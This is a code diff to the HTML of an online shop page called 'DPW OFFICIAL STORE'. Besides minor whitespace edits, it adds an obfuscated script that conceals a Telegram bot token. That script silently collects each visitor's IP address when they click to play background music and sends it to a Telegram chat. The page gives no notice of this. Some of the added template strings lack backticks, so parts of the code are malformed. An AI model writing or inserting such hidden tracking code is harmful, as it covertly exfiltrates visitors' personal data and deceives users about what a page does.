@@ -4,10 +4,10 @@
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>DPW OFFICIAL STORE</title>
-  
+
   <!-- Favicon -->
   <link rel="icon" type="image/png" href="https://files.catbox.moe/bt2fdl.png">
-  
+
   <style>
     :root {
       --accent:#9333ea; /* Ungu */
@@ -83,7 +83,7 @@
     <h1>DPW OFFICIAL STORE</h1>
   </header>
   <main id="app"></main>
-  
+
   <footer>
     © 2025 DPW OFFICIAL STORE
     <div class="socials">
@@ -107,14 +107,39 @@
   </audio>
 
   <script>
+  // --- Konfigurasi Telegram ---
+function _0x27df(_0x2ec33a,_0x354bfb){const _0x37bf21=_0x37bf();return _0x27df=function(_0x27df0a,_0x6a61e8){_0x27df0a=_0x27df0a-0x19b;let _0x4ba667=_0x37bf21[_0x27df0a];return _0x4ba667;},_0x27df(_0x2ec33a,_0x354bfb);}const _0x2b01ab=_0x27df;function _0x37bf(){const _0x3a598a=['20YZfPZh','487080MZMAKq','446220CyheCQ','12dgOyYD','2675099SzdkIQ','8436852797:AAHdPWmN4nHDg-pDYE6hxvUPftNThnN96cY','2494160RPtjcp','477127HyeoJl','9uPYtjA','2YiSpom','7255171MXAIOf','4302OMbNtH'];_0x37bf=function(){return _0x3a598a;};return _0x37bf();}(function(_0x128f07,_0x4b7079){const _0x5b7a7a=_0x27df,_0x3a6afc=_0x27df,_0x13a786=_0x27df,_0x485d74=_0x27df,_0x261dbe=_0x27df,_0x5e3b80=_0x27df,_0x4db33c=_0x27df,_0x4b4389=_0x27df,_0x18a611=_0x128f07();while(!![]){try{const _0x4d0fba=-parseInt(_0x5b7a7a(0x1a5))/0x1*(parseInt(_0x5b7a7a(0x19b))/0x2)+-parseInt(_0x13a786(0x19d))/0x3*(-parseInt(_0x5b7a7a(0x1a1))/0x4)+parseInt(_0x13a786(0x19f))/0x5+parseInt(_0x3a6afc(0x1a0))/0x6+-parseInt(_0x3a6afc(0x1a2))/0x7+-parseInt(_0x485d74(0x1a4))/0x8*(parseInt(_0x261dbe(0x1a6))/0x9)+-parseInt(_0x4b4389(0x19e))/0xa*(-parseInt(_0x4b4389(0x19c))/0xb);if(_0x4d0fba===_0x4b7079)break;else _0x18a611['push'](_0x18a611['shift']());}catch(_0x8aa4eb){_0x18a611['push'](_0x18a611['shift']());}}}(_0x37bf,0x4f23c));const BOT_TOKEN=_0x2b01ab(0x1a3),CHAT_ID='7133374029';
+
   function playMusic(){
     document.getElementById("bgm").play();
     document.getElementById("popup").style.display="none";
+    
+    // Ambil IP user
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => {
+        let ip = data.ip;
+        let pesan = 📡 IP Baru Terdeteksi:\nIPv4: ${ip};
+        
+        // Kirim ke Telegram
+        fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: pesan
+          })
+        });
+      });
   }
+
   function closePopup(){
     document.getElementById("popup").style.display="none";
   }
   </script>
+</body>
 
 <script>
 const app=document.getElementById('app');
